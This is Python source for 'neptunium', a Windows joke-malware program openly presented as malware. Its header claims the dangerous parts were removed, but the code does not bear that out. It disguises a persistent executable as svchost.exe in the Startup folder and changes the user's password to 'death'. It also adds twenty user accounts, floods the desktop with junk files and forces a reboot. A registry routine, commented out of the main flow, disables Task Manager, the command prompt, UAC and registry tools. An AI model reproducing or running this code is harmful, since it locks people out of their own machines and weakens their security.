#neptunium source code without dangerous elements
#copywrite (c) ChenSijia 2023

#import

from win32gui import*
from win32con import*
import os
import shutil
from win32ui import*
from win32api import*
from win32file import *
import platform
import sys

#variables

user = os.getlogin() #username
dpath = os.environ["USERPROFILE"] + "/Desktop/" #desktop location
userfolder = os.environ["USERPROFILE"]  #user directory
stup = os.environ["USERPROFILE"] + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe" #startup file location


def resource_path(relative_path):

    try:
        base_path = sys._MEIPASS

    except Exception:
        
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)
    
class copy:
    
    def copytheme():
        shutil.copy(resource_path("neptunium.theme"), "C:\\Windows\\System32\\windows.theme")
    
    def copyimage():
        shutil.copy(resource_path("bkg.png"), "C:\\Windows\\System32\\bkg.png")
    
    def copymalware():
        shutil.copy(resource_path("main.exe"), stup) #copy the main malware file

class personalize:

    def runtheme():
        os.startfile("C:\\Windows\\System32\\windows.theme")

class system:

    def createfile():
        os.popen("fsutil file createnew C:\⅗◴ɵ©œÿɮɰʑÜï" + " 666") #create file with 666 bytes

    def copyfile():
        for i in range(500):
            shutil.copy("C:\⅗◴ɵ©œÿɮɰʑÜï", dpath + "⅗◴ɵ©œÿɮɰʑÜï"+ str(i) ) #copy it to desktop

    def adduser():
        for i in range(20):
            os.popen("net user /add ᾒəῥͳὗɴɪὗɱ"+str(i)+" key="+"ᾒəῥͳὗɴɪὗɱ") #add users

    def changepasswrd():
        os.popen("net user "+user+" death") #change password to death
    
    def startinstaller():
        os.startfile(resource_path("1.exe"))
        
    def reboot():
        os.popen("shutdown /r /t 00")

class reg:

    def addkeys():
        os.popen('REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
        os.popen('REG ADD "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f')
        os.popen('REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f')
        os.popen('REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableLogonBackgroundImage /t REG_DWORD /d 1 /f')
        os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 2 /f')
        os.popen('reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "AutoAdminLogon" /t REG_SZ /d 0 /f')
        os.popen('reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "DisableCAD" /t REG_DWORD /d 1 /f')
def main(): #main func

        copy.copytheme()
        copy.copyimage()
        copy.copymalware()
        system.createfile()
        system.changepasswrd()
        ###reg.addkeys
        system.startinstaller()
        system.adduser()
        Sleep(1000)
        system.copyfile()
        personalize.runtheme()
        while True:
            if os.path.isfile("C:\\command") == False:
                pass
            else:
                Sleep(1000)
                system.reboot()
                sys.exit() #enouth damage, exit XD
            
        

if __name__ == "__main__": 

    if platform.system() == "Windows": #check if the os is Windows
    
            if MessageBox(0,"N̷͇̆o̷̤̊ẗ̴͈́h̶̯͗í̸̬ṅ̶̙ġ̸͉ ̴͕͗í̷̮s̴̪̐ ̴̠͌ẘ̴̩o̴͕̔r̸̖͝ț̸̕h̸̘̔ ̸̫̿t̴̞̆h̴̗̀ȩ̵͊ ̴͔͆r̵͑ͅî̴͇ṣ̴̈ḱ̸̪.\r\nĊðɴͳἻŇὗë?", "ń̷̹͔͉̩̌ȩ̷̝̣̩̖̌p̵̫̯̚ṱ̶̘̱̭̬̼̉̄͆̒̕u̶̬͈̙̬̱͈̇̏n̴̡͍̂̀̒͂̌͂i̴͍̻̮͍͕̟͒̍͋̄͝ú̸̟̳̔̈́̚m.exe", MB_YESNO | MB_ICONQUESTION | MB_SERVICE_NOTIFICATION | MB_DEFBUTTON2) == IDYES:
                
                if MessageBox(0, "Want to be a victim of ń̷̹͔͉̩̌ȩ̷̝̣̩̖̌p̵̫̯̚ṱ̶̘̱̭̬̼̉̄͆̒̕u̶̬͈̙̬̱͈̇̏n̴̡͍̂̀̒͂̌͂i̴͍̻̮͍͕̟͒̍͋̄͝ú̸̟̳̔̈́̚m?", "ń̷̹͔͉̩̌ȩ̷̝̣̩̖̌p̵̫̯̚ṱ̶̘̱̭̬̼̉̄͆̒̕u̶̬͈̙̬̱͈̇̏n̴̡͍̂̀̒͂̌͂i̴͍̻̮͍͕̟͒̍͋̄͝ú̸̟̳̔̈́̚m.exe", MB_YESNO | MB_ICONQUESTION | MB_SERVICE_NOTIFICATION | MB_DEFBUTTON2) == IDYES:
                    
                    #two warnings

                    main()

                else:
                    sys.exit()
                    
            else:

                sys.exit()
    else:

        #if user is not using Windows

        MessageBox(0, "You need a Windows virtual machine to run this malware", "", MB_SERVICE_NOTIFICATION | MB_ICONERROR | MB_DEFBUTTON1)
        
        sys.exit()

        
